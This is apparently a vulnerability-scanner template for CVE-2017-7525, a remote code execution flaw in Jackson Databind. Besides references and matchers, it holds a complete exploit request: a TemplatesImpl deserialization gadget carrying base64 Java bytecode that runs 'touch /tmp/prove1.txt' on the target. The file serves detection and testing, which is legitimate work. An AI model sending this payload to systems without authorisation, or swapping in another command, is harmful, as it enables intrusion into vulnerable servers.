id: CVE-2017-7525
info:
  author: cheoljun99,KoYejune0302,sim4110,gy741
  classification:
    cve-id: CVE-2017-7525
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  description: 'Jackson Databind is a popular Java library used for serializing Java
    objects to JSON (JavaScript Object Notation) and deserializing JSON back into
    Java objects.

    CVE-2017-7525 is a critical deserialization vulnerability in the Jackson library
    which allows for remote code execution.

    Vulnerable environment is Jackson 2.8.8

    Send following request to use the Template to execute Java bytescode, which contains
    command touch /tmp/prove1.txt

    '
  name: Jackson RCE - Unauthenticated Remote Code Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/cve-2017-7525
  - https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization
  - https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/
  - https://github.com/irsl/jackson-rce-via-spel
  - https://github.com/FasterXML/jackson-databind/commit/60d459cedcf079c6106ae7da2ac562bc32dcabe1
  severity: critical
  tags: Jackson,cve,cve2017,rce,unauth
requests:
- matchers:
  - status:
    - 400
    type: status
  - part: header
    type: word
    words:
    - application/json
  - type: word
    words:
    - 'JSON parse error: null; nested exception is com.fasterxml.jackson.databind.JsonMappingException'
  matchers-condition: and
  raw:
  - "POST {{path}} HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\n\
    Accept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0;\
    \ Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/json\n\
    Content-Length: 1298\n\n{\n  \"param\": [\n    \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"\
    ,\n    {\n      \"transletBytecodes\": [\n        \"yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw==\"\
    \n      ],\n      \"transletName\": \"a.b\",\n      \"outputProperties\": {}\n\
    \    }\n  ]\n}\n"
